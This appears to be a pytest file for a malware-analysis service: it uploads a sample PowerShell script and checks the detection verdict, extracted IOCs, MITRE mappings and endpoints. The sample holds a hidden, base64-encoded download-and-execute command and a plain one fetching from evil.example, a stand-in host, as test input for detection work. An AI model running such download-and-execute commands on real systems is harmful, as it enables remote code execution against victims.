"""End-to-end: upload a malicious script, poll analysis, verify Phase 3 payload."""
import time

MALICIOUS_PS1 = (
    "powershell -nop -windowstyle hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA"
    'aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQA' + "\r\n"
    "invoke-expression (New-Object Net.WebClient).DownloadString('http://evil.example/payload')" + "\r\n"
    "attacker@evil.example" + "\r\n"
    "C:\\Users\\victim\\AppData\\Roaming\\backup.exe" + "\r\n"
)


def _wait_completed(client, inv_id, timeout=20.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        inv = client.get(f"/api/investigations/{inv_id}").json()
        if inv["status"] == "completed":
            return inv
        time.sleep(0.25)
    raise AssertionError(f"analysis did not complete within {timeout}s (status={inv['status']})")


def test_upload_script_and_detection_pipeline(client):
    created = client.post(
        "/api/samples/upload",
        files={"file": ("update.ps1", MALICIOUS_PS1.encode(), "application/octet-stream")},
    ).json()["investigation"]
    _wait_completed(client, created["id"])

    static = client.get(f"/api/investigations/{created['id']}/static").json()
    assert static["status"] == "completed"
    result = static["result"]

    # Phase 3 keys present and shaped correctly.
    assert "evidence" in result and isinstance(result["evidence"], list)
    assert "iocs" in result and isinstance(result["iocs"], list)
    assert "mitre" in result and isinstance(result["mitre"], list)
    assert "graph" in result and result["graph"]["nodes"]

    # The sample is clearly malicious script -> verdict must not be clean.
    assert result["score"]["verdict"] in ("suspicious", "malicious")
    assert result["score"]["severity"] in ("high", "critical", "medium")

    # IOC coverage for the embedded indicators.
    ioc_values = {(i["type"], i["value"]) for i in result["iocs"]}
    assert any(t == "url" and "evil.example" in v for t, v in ioc_values)
    assert any(t == "email" for t, v in ioc_values)
    assert any(t == "command" for t, v in ioc_values)

    # Every evidence entry has the normalized shape.
    for ev in result["evidence"]:
        assert ev["id"].startswith("ev-")
        assert ev["source_module"] and ev["confidence"] >= 0 and ev["confidence"] <= 1


def test_dedicated_endpoints_serve_stored_data(client):
    created = client.post(
        "/api/samples/upload",
        files={"file": ("ioc_check.ps1", MALICIOUS_PS1.encode(), "application/octet-stream")},
    ).json()["investigation"]
    _wait_completed(client, created["id"])
    inv_id = created["id"]

    findings = client.get(f"/api/investigations/{inv_id}/findings").json()
    assert findings["status"] == "completed"
    assert findings["findings"]

    iocs = client.get(f"/api/investigations/{inv_id}/iocs").json()
    assert iocs["status"] == "completed"
    assert iocs["iocs"]

    mitre = client.get(f"/api/investigations/{inv_id}/mitre").json()
    assert mitre["status"] == "completed"
    assert mitre["techniques"]

    graph = client.get(f"/api/investigations/{inv_id}/graph").json()
    assert graph["status"] == "completed"
    assert graph["graph"]["nodes"] and graph["graph"]["edges"]

    ti = client.get(f"/api/investigations/{inv_id}/threat-intel").json()
    assert ti["iocs"], "threat-intel must carry the extracted IOCs"

    dynamic = client.get(f"/api/investigations/{inv_id}/dynamic").json()
    assert dynamic["status"] in ("completed", "unavailable")
    assert isinstance(dynamic.get("result"), dict)

    trace = client.get(f"/api/investigations/{inv_id}/trace").json()
    assert trace["status"] == "completed"
    assert trace["trace"]["trace_id"].startswith("trace-")
    assert trace["trace"]["evidence_count"] >= 0
